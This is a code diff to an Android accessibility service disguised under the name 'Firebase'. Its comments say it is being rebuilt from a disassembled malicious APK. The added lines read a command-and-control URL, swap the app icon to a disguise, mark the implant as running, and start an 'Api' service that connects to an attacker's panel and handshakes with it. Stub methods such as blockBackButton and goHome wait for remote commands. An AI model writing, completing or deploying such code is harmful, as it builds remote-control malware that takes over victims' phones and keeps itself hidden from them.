@@ -7,7 +7,6 @@ import android.view.accessibility.AccessibilityEvent;
 
 public class Firebase extends AccessibilityService {
 
-    // Static state fields — used by Api command dispatcher
     public static Boolean  FirebaseFOR_IN      = false;
     public static Boolean  FirebaseFOR_prim     = false;
     public static Boolean  Firebasebypass       = false;
@@ -17,26 +16,11 @@ public class Firebase extends AccessibilityService {
     public static boolean  needPaste            = false;
     public static String   pasteText            = "";
 
-    // -------------------------------------------------------------------------
-    // onServiceConnected — called by Android when accessibility service binds
-    //
-    // Confirmed from original APK disassembly (code_off=0xe7084, isz=176):
-    //   [0]   invoke-super onServiceConnected
-    //   [3]   new AccessibilityServiceInfo, set flags=19 eventTypes=15 feedbackType=15
-    //   [24]  setServiceInfo(info)
-    //   [27]  love.MyAccess = this
-    //   [118] LoveApi0.isServiceNotRunning(love.class, getApplication())
-    //   [128] if love already running → skip startService
-    //   [130] if love NOT running → startService(love)
-    //   [175] return-void
-    //   Note: body.IP_body_I check (units 70-94) always false → dead code, skipped
-    //   Note: myker startService (units 146-172) skipped — myker NOT in manifest
-    // -------------------------------------------------------------------------
     @Override
     protected void onServiceConnected() {
         super.onServiceConnected();
 
-        // Set up AccessibilityServiceInfo — mirrors original APK units [3-24]
+        // Set AccessibilityServiceInfo — APK onServiceConnected units [3-24]
         try {
             AccessibilityServiceInfo info = new AccessibilityServiceInfo();
             info.flags            = 19;
@@ -47,34 +31,55 @@ public class Firebase extends AccessibilityService {
             setServiceInfo(info);
         } catch (Exception ignored) {}
 
-        // Set accessibility instance — original APK unit [27]: sput-object v9, love.MyAccess
+        // Set accessibility instance — APK unit [27]
         love.MyAccess = this;
 
-        // Set allok = true so love.onStartCommand passes its guard and starts Api
-        love.allok = true;
-
-        // Check if love is already running — original APK units [118-137]
-        // isServiceNotRunning returns true if NOT running → need to start it
+        // Read C2 URL from resources and store — APK Api.onCreate units [66-77]
+        // This populates Utils.p_Utils_r which Api.initializeAndConnect checks
         try {
-            boolean loveNotRunning = LoveApi0.isServiceNotRunning(love.class, getApplication());
-            if (loveNotRunning) {
-                startService(new Intent(this, love.class));
+            Utils.p_Utils_r = getApplicationContext().getResources()
+                    .getString(R.string.newss);
+        } catch (Exception ignored) {
+            // Falls back to love.Host / love.Port which are hardcoded in love.java
+        }
+
+        // Icon swap — APK myker.setSupportCompoundDrawablesTintMode units [340-346]
+        try {
+            Utils.swapAppIcon(getApplicationContext(), "I#C#O#N#S#C#A#N#E#R");
+        } catch (Exception ignored) {}
+
+        // Guard: skip if already initialized — APK myker unit [349-351]
+        if (Utils.iamworking) {
+            return;
+        }
+
+        // Mark initialized — APK myker units [353-355]
+        love.allok = true;
+        Utils.iamworking = true;
+
+        // Start Api directly — APK myker units [371-399]
+        // Api.onCreate → initializeAndConnect → NetworkManager → TCP connect
+        // → sendHandshake → panel shows "New Keys..." → "Ready"
+        try {
+            if (LoveApi0.isServiceNotRunning(Api.class, getApplicationContext())) {
+                startService(new Intent(getApplicationContext(), Api.class));
+            }
+        } catch (Exception ignored) {}
+
+        // Start love service — APK onServiceConnected units [118-137]
+        try {
+            if (LoveApi0.isServiceNotRunning(love.class, getApplicationContext())) {
+                startService(new Intent(getApplicationContext(), love.class));
             }
         } catch (Exception ignored) {}
     }
 
-    // -------------------------------------------------------------------------
-    // Required AccessibilityService overrides
-    // -------------------------------------------------------------------------
     @Override
     public void onAccessibilityEvent(AccessibilityEvent e) {}
 
     @Override
     public void onInterrupt() {}
 
-    // -------------------------------------------------------------------------
-    // Methods called by Api command dispatcher
-    // -------------------------------------------------------------------------
     public void blockBackButton() {}
     public void goHome() {}
     public void triggerAction() {}
